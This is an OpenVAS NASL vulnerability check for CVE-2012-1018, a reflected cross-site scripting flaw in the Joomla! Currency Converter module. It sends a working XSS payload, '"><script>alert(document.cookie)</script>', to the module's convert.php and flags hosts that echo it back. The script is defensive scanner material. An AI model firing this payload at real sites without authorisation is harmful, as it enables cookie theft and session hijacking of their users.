##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_mod_currencyconverter_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Joomla! Currency Converter Module 'from' Parameter Cross-Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.
  Impact Level: Application";
tag_affected = "Joomla! Currency Converter Module version 1.0.0";
tag_insight = "The flaw is due to an input passed via 'from' parameter to
  '/includes/convert.php' is not properly sanitised before being returned to
  the user.";
tag_solution = "No solution or patch is available as of 09th, February, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.joomla.org";
tag_summary = "This host is running Joomla with Currency Converter module and is
  prone to cross-site scripting vulnerability.";

if(description)
{
  script_id(802588);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-1018");
  script_bugtraq_id(51804);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date");
  script_tag(name:"creation_date", value:"2012-02-09 12:55:09 +0530 (Thu, 09 Feb 2012)");
  script_name("Joomla! Currency Converter Module 'from' Parameter Cross-Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/72917");
  script_xref(name : "URL" , value : "http://dl.packetstormsecurity.net/1202-exploits/joomlacurrencyconverter-xss.txt");

  script_description(desc);
  script_summary("Check if Joomla Currency Converter Module vulnerable for XSS attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Variable Initialization
joomlaPort = 0;
joomlaDir = "";
url = "";

## Get HTTP Port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Check host supports PHP
if(!can_host_php(port:joomlaPort)){
  exit(0);
}

## Get Joomla directory
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

## Construct attack
url = joomlaDir + '/modules/mod_currencyconverter/includes/convert.php?' +
                  'from="><script>alert(document.cookie)</script>';

## Confirm exploit worked properly or not
if(http_vuln_check(port:joomlaPort, url:url, pattern:"><script>alert\(" +
                                    "document.cookie\)</script>")){
  security_warning(joomlaPort);
}
